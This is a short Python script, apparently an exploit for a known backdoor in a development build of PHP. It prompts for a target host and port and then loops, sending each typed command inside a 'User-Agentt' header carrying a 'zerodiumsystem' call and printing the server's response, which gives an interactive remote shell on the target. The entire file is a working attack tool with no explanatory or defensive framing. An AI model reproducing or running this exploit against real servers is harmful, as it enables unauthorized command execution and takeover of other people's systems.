import requests


RHOST=input("RHOST:")
RPORT=input("RPORT:")
while True:
    cmd=input("$:")
    if cmd=="":
        continue
    elif cmd=="exit":
        exit()
    headers={"User-Agentt":f"zerodiumsystem(\"{cmd}\");"}
    res=requests.get(url=f"http://{RHOST}:{RPORT}/",headers=headers)
    print(res.text[:-12])

